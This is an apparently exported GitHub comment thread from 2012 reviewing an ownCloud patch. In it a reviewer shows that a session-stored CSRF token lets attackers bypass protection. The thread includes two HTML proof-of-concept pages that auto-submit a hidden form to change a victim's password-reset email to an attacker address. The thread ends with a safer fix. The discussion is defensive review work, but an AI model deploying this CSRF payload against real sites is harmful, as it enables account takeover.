[{"url":"https://api.github.com/repos/owncloud/core/issues/comments/9871026","html_url":"https://github.com/owncloud/core/pull/122#issuecomment-9871026","issue_url":"https://api.github.com/repos/owncloud/core/issues/122","id":9871026,"user":{"login":"lukasreschke","id":878997,"avatar_url":"https://gravatar.com/avatar/f080e75d370a4d8e550983a4898bcf3b?d=https%3a%2f%2fidenticons.github.com%2ff12e47d5bb5359a9f58e8217413be790.png&r=x","gravatar_id":"f080e75d370a4d8e550983a4898bcf3b","url":"https://api.github.com/users/lukasreschke","html_url":"https://github.com/lukasreschke","followers_url":"https://api.github.com/users/lukasreschke/followers","following_url":"https://api.github.com/users/lukasreschke/following{/other_user}","gists_url":"https://api.github.com/users/lukasreschke/gists{/gist_id}","starred_url":"https://api.github.com/users/lukasreschke/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/lukasreschke/subscriptions","organizations_url":"https://api.github.com/users/lukasreschke/orgs","repos_url":"https://api.github.com/users/lukasreschke/repos","events_url":"https://api.github.com/users/lukasreschke/events{/privacy}","received_events_url":"https://api.github.com/users/lukasreschke/received_events","type":"user","site_admin":false},"created_at":"2012-10-29t15:29:19z","updated_at":"2012-10-29t15:29:19z","body":"i looked again over the patch and saw a huge problem.\r\n\r\n---------------------------------------\r\n###### vulnerability\r\nin `apps/files/ajax/iframerequest.php` you're creating the session variable `iframe_requesttoken` containing the csrf token.\r\n```php\r\n$_session['iframe_requesttoken']=oc_util::callregister();\r\n``` \r\nwhich is checked then in `lib/util.php`\r\n```diff\r\n--- a/lib/util.php\r\n+++ b/lib/util.php\r\n@@ -528,6 +528,9 @@ public static function iscallregistered() {\r\n \t\t\t$token=$_post['requesttoken'];\r\n \t\t}elseif(isset($_server['http_requesttoken'])) {\r\n \t\t\t$token=$_server['http_requesttoken'];\r\n+\t\t}elseif(isset($_session['iframe_requesttoken'])) {\r\n+\t\t\t$token=$_session['iframe_requesttoken'];\r\n+\t\t\tunset($_session['iframe_requesttoken']);\t\t\t\r\n \t\t}else{\r\n \t\t\t//no token found.\r\n \t\t\treturn false;\r\n```\r\nusing a session variable here is a security risk, an attacker just need to send the user to `domain.tld/owncloud/apps/files/ajax/iframerequest.php` and the session variable `iframe_requesttoken` is created. \r\n\r\nnow the attacker can do a normal csrf attack because a valid `iframe_requesttoken` exists which allows him to bypass the csrf check.\r\n\r\n---------------------------------------\r\n\r\n###### suggestion\r\nwe need another solution than using `$_session` for this problem, a better approach would be do find the reason why  internet explorer < 9 isn't sending the csrf token and find a way to let ie send it."},{"url":"https://api.github.com/repos/owncloud/core/issues/comments/9875997","html_url":"https://github.com/owncloud/core/pull/122#issuecomment-9875997","issue_url":"https://api.github.com/repos/owncloud/core/issues/122","id":9875997,"user":{"login":"libasys","id":2439975,"avatar_url":"https://gravatar.com/avatar/0bfb059c939dd076d50a3a34668b49d3?d=https%3a%2f%2fidenticons.github.com%2fc87a66092ce1c6021848d8dd228b20a2.png&r=x","gravatar_id":"0bfb059c939dd076d50a3a34668b49d3","url":"https://api.github.com/users/libasys","html_url":"https://github.com/libasys","followers_url":"https://api.github.com/users/libasys/followers","following_url":"https://api.github.com/users/libasys/following{/other_user}","gists_url":"https://api.github.com/users/libasys/gists{/gist_id}","starred_url":"https://api.github.com/users/libasys/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/libasys/subscriptions","organizations_url":"https://api.github.com/users/libasys/orgs","repos_url":"https://api.github.com/users/libasys/repos","events_url":"https://api.github.com/users/libasys/events{/privacy}","received_events_url":"https://api.github.com/users/libasys/received_events","type":"user","site_admin":false},"created_at":"2012-10-29t16:50:14z","updated_at":"2012-10-29t17:05:02z","body":"that's not true, because when you do a direct call on the iframerequest.php no session would be create. in the file is no session_start() call and so no new session created. \r\n\r\nlook here: https://ssl.webpack.de/demo.libasyscloud.de/apps/files/ajax/iframerequest.php"},{"url":"https://api.github.com/repos/owncloud/core/issues/comments/9877000","html_url":"https://github.com/owncloud/core/pull/122#issuecomment-9877000","issue_url":"https://api.github.com/repos/owncloud/core/issues/122","id":9877000,"user":{"login":"lukasreschke","id":878997,"avatar_url":"https://gravatar.com/avatar/f080e75d370a4d8e550983a4898bcf3b?d=https%3a%2f%2fidenticons.github.com%2ff12e47d5bb5359a9f58e8217413be790.png&r=x","gravatar_id":"f080e75d370a4d8e550983a4898bcf3b","url":"https://api.github.com/users/lukasreschke","html_url":"https://github.com/lukasreschke","followers_url":"https://api.github.com/users/lukasreschke/followers","following_url":"https://api.github.com/users/lukasreschke/following{/other_user}","gists_url":"https://api.github.com/users/lukasreschke/gists{/gist_id}","starred_url":"https://api.github.com/users/lukasreschke/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/lukasreschke/subscriptions","organizations_url":"https://api.github.com/users/lukasreschke/orgs","repos_url":"https://api.github.com/users/lukasreschke/repos","events_url":"https://api.github.com/users/lukasreschke/events{/privacy}","received_events_url":"https://api.github.com/users/lukasreschke/received_events","type":"user","site_admin":false},"created_at":"2012-10-29t17:12:44z","updated_at":"2012-10-29t19:47:51z","body":"well, the point here is that the attacker is able to make a csrf attack.\r\n\r\n- attacker creates a crafted form\r\n  - containing the iframe\r\n- attacker sends the link to the victim\r\n- victim clicks the link\r\n- password reset mail is changed to attacker@bad-guy.net\r\n\r\n###### proof of concept\r\n\r\n```html\r\n<html>\r\n<body>\r\n\t<!-- load the iframe - please note that an attacker would hide it -->\r\n\t<iframe src=\"apps/files/ajax/iframerequest.php\"></iframe>\r\n\t<!-- the form - please note that an attacker would send it automatically with js -->\r\n\t<form action=\"index.php/settings/ajax/lostpassword.php\" method=\"post\">\r\n\t\t<!-- set the email to attacker@bad-guy.net -->\r\n\t\t<input type=\"hidden\" name=\"email\" value=\"attacker&#64;bad-guy&#46;net\" />\r\n\t\t<input type=\"submit\" value=\"submit form\" />\r\n\t</form>\r\n</body>\r\n</html>\r\n```"},{"url":"https://api.github.com/repos/owncloud/core/issues/comments/9879790","html_url":"https://github.com/owncloud/core/pull/122#issuecomment-9879790","issue_url":"https://api.github.com/repos/owncloud/core/issues/122","id":9879790,"user":{"login":"libasys","id":2439975,"avatar_url":"https://gravatar.com/avatar/0bfb059c939dd076d50a3a34668b49d3?d=https%3a%2f%2fidenticons.github.com%2fc87a66092ce1c6021848d8dd228b20a2.png&r=x","gravatar_id":"0bfb059c939dd076d50a3a34668b49d3","url":"https://api.github.com/users/libasys","html_url":"https://github.com/libasys","followers_url":"https://api.github.com/users/libasys/followers","following_url":"https://api.github.com/users/libasys/following{/other_user}","gists_url":"https://api.github.com/users/libasys/gists{/gist_id}","starred_url":"https://api.github.com/users/libasys/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/libasys/subscriptions","organizations_url":"https://api.github.com/users/libasys/orgs","repos_url":"https://api.github.com/users/libasys/repos","events_url":"https://api.github.com/users/libasys/events{/privacy}","received_events_url":"https://api.github.com/users/libasys/received_events","type":"user","site_admin":false},"created_at":"2012-10-29t18:23:40z","updated_at":"2012-10-29t18:23:40z","body":"ok i don't understand your example! when you use the iframe, what should happend? it causes an fatal error in the iframe because the method of ocp\\json::checkloggedin() is not known. the correct call for the iframerequest is\r\n?app=files&getfile=ajax/iframerequest.php!?!"},{"url":"https://api.github.com/repos/owncloud/core/issues/comments/9882636","html_url":"https://github.com/owncloud/core/pull/122#issuecomment-9882636","issue_url":"https://api.github.com/repos/owncloud/core/issues/122","id":9882636,"user":{"login":"lukasreschke","id":878997,"avatar_url":"https://gravatar.com/avatar/f080e75d370a4d8e550983a4898bcf3b?d=https%3a%2f%2fidenticons.github.com%2ff12e47d5bb5359a9f58e8217413be790.png&r=x","gravatar_id":"f080e75d370a4d8e550983a4898bcf3b","url":"https://api.github.com/users/lukasreschke","html_url":"https://github.com/lukasreschke","followers_url":"https://api.github.com/users/lukasreschke/followers","following_url":"https://api.github.com/users/lukasreschke/following{/other_user}","gists_url":"https://api.github.com/users/lukasreschke/gists{/gist_id}","starred_url":"https://api.github.com/users/lukasreschke/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/lukasreschke/subscriptions","organizations_url":"https://api.github.com/users/lukasreschke/orgs","repos_url":"https://api.github.com/users/lukasreschke/repos","events_url":"https://api.github.com/users/lukasreschke/events{/privacy}","received_events_url":"https://api.github.com/users/lukasreschke/received_events","type":"user","site_admin":false},"created_at":"2012-10-29t19:46:04z","updated_at":"2012-10-30t12:46:17z","body":"> it causes an fatal error in the iframe because the method of ocp\\json::checkloggedin() is not known.\r\n\r\nseems like you don't have mod_rewrite enabled :-) - it will rewrite `apps/files/ajax/iframerequest.php` to `index.php?app=files&getfile=ajax/iframerequest.php`:\r\n```\r\n<ifmodule mod_rewrite.c>\r\nrewriteengine on\r\n[...]\r\nrewriterule ^apps/([^/]*)/(.*\\.(css|php))$ index.php?app=$1&getfile=$2 [qsa,l]\r\n[...]\r\n</ifmodule>\r\n```\r\n\r\nin this case, just change the iframe src to `index.php?app=files&amp;getfile=ajax/iframerequest.php` and save it in your owncloud root directory. - after clicking submit your password reset mail has changed. this is exactly what our csrf token should prevent, but the `$_session['iframe_requesttoken']` approach makes the csrf protection useless.\r\n```html\r\n<html>\r\n<body>\r\n    <!-- load the iframe - please note that an attacker would hide it -->\r\n    <iframe src=\"index.php?app=files&amp;getfile=ajax/iframerequest.php\"></iframe>\r\n    <!-- the form - please note that an attacker would send it automatically with js -->\r\n    <form action=\"index.php/settings/ajax/lostpassword.php\" method=\"post\">\r\n        <!-- set the email to attacker@bad-guy.net -->\r\n        <input type=\"hidden\" name=\"email\" value=\"attacker&#64;bad-guy&#46;net\" />\r\n        <input type=\"submit\" value=\"submit form\" />\r\n    </form>\r\n</body>\r\n</html>\r\n```"},{"url":"https://api.github.com/repos/owncloud/core/issues/comments/9902559","html_url":"https://github.com/owncloud/core/pull/122#issuecomment-9902559","issue_url":"https://api.github.com/repos/owncloud/core/issues/122","id":9902559,"user":{"login":"libasys","id":2439975,"avatar_url":"https://gravatar.com/avatar/0bfb059c939dd076d50a3a34668b49d3?d=https%3a%2f%2fidenticons.github.com%2fc87a66092ce1c6021848d8dd228b20a2.png&r=x","gravatar_id":"0bfb059c939dd076d50a3a34668b49d3","url":"https://api.github.com/users/libasys","html_url":"https://github.com/libasys","followers_url":"https://api.github.com/users/libasys/followers","following_url":"https://api.github.com/users/libasys/following{/other_user}","gists_url":"https://api.github.com/users/libasys/gists{/gist_id}","starred_url":"https://api.github.com/users/libasys/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/libasys/subscriptions","organizations_url":"https://api.github.com/users/libasys/orgs","repos_url":"https://api.github.com/users/libasys/repos","events_url":"https://api.github.com/users/libasys/events{/privacy}","received_events_url":"https://api.github.com/users/libasys/received_events","type":"user","site_admin":false},"created_at":"2012-10-30t11:41:42z","updated_at":"2012-10-30t11:41:42z","body":"ok another way! we implement in the uploadform an input type=\"hidden\" field with name=requesttoken and the value is the actual requesttoken! so there is no need of iframerequest.php\r\n\r\ncall in the template index.php\r\n\r\n< input type=\"hidden\" name=\"requesttoken\" value=\"<?php print oc_util::getacttoken(); ?>\" />\r\n\r\n\r\nwe must add two more things to lib/util.php\r\n\r\nfirst on the top of the class:\r\n\r\nprivate static $stoken='';\r\n\r\nthan a new function like\r\n\r\n public static function getacttoken(){\r\n   \t//oc_log::write('core', 'gettoken: '.self::$stoken, oc_log::debug);\r\n\t return self::$stoken;\r\n   }\r\n\r\nand in the function callregister() we add before return \r\n\r\nself::$stoken=$token;\r\n// return the token\r\nreturn($token); \r\n\r\nis this a better way? it works with safari when i say in the files.js forceiframetransport:true"},{"url":"https://api.github.com/repos/owncloud/core/issues/comments/9912181","html_url":"https://github.com/owncloud/core/pull/122#issuecomment-9912181","issue_url":"https://api.github.com/repos/owncloud/core/issues/122","id":9912181,"user":{"login":"lukasreschke","id":878997,"avatar_url":"https://gravatar.com/avatar/f080e75d370a4d8e550983a4898bcf3b?d=https%3a%2f%2fidenticons.github.com%2ff12e47d5bb5359a9f58e8217413be790.png&r=x","gravatar_id":"f080e75d370a4d8e550983a4898bcf3b","url":"https://api.github.com/users/lukasreschke","html_url":"https://github.com/lukasreschke","followers_url":"https://api.github.com/users/lukasreschke/followers","following_url":"https://api.github.com/users/lukasreschke/following{/other_user}","gists_url":"https://api.github.com/users/lukasreschke/gists{/gist_id}","starred_url":"https://api.github.com/users/lukasreschke/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/lukasreschke/subscriptions","organizations_url":"https://api.github.com/users/lukasreschke/orgs","repos_url":"https://api.github.com/users/lukasreschke/repos","events_url":"https://api.github.com/users/lukasreschke/events{/privacy}","received_events_url":"https://api.github.com/users/lukasreschke/received_events","type":"user","site_admin":false},"created_at":"2012-10-30t16:22:43z","updated_at":"2012-10-30t16:22:43z","body":"> we implement in the uploadform an input type=\"hidden\" field with name=requesttoken and the value is the actual requesttoken!\r\n\r\nthis would be a proper solution. please check #155. "}]